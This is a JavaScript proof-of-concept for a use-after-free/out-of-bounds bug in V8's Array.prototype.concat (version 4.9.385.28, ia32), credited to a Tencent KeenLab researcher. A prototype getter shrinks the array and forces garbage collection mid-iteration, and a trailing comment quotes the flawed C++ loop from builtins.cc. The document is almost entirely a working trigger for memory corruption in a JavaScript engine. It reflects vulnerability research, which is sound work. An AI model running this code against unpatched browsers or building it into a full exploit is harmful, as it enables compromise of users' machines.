// Owner: Wen Xu from Tencent KeenLab
// v8 version: 4.9.385.28, ia32

function gc() {
	tmp = [];
	for (var i = 0; i < 0x100000; i++)
		tmp.push(new Uint8Array(10));
	tmp = null;
}

var b = new Array();
b[0] = 0.1;
b[2] = 2.1;
b[3] = 3.1;
b[4] = 4.1;
b[5] = 5.1;
b[6] = 6.1;
b[7] = 7.1;
b[8] = 8.1;
b[9] = 9.1;
b[10] = 10.1;

// define b.__proto__[1] to gain the control in the middle of the loop
Object.defineProperty(b.__proto__, 1, { 
	get: function() {
		b.length = 1;
		gc();
		return 1;
	},
	set: function(new_value) {
		value = new_value;
	}
});

var c = b.concat();


/*

Array.prototype.concat in builtins.cc does not properly consider element data types.
Array.prototype.concat did not work correct with complex elements on the receiver or prototype chain.

    src/builtin.cc, IterateElements
        switch(array->GetElementsKind()) {
	  case FAST_SMI_ELEMENTS:
	  case FAST_ELEMENTS:
	    ....
	    Handle<FixedArray> elements(FixedArray::cast(array->elements));
	    int fast_length = static_cast<int>(length); <-- but, iterate out-of-bounds
	    for (int j=0; j<fast_length; j++) {
	      ...
	      Handle<Object> element_value(elements->get(), isolate);
	      if (!element->value->IsTheHole()) visitor->visit(j, element_value);
	      else {
	        Maybe<bool> maybe = JSReceiver::HasElement(array, j);
		if (!maybe.IsJust()) return false;
		if (maybe.FromJust()) {
		  ASSIGN_RETURN_ON_EXCEPTION_VALUE(isolate, element_value, Object::GetElement(isolate, array, j, false)
		  // redefine the function to get the value in array's __proto__ with index j
		  // we can make the length of the array shorter ( < fast_length )
		}
	      }
	    }
        ....
*/
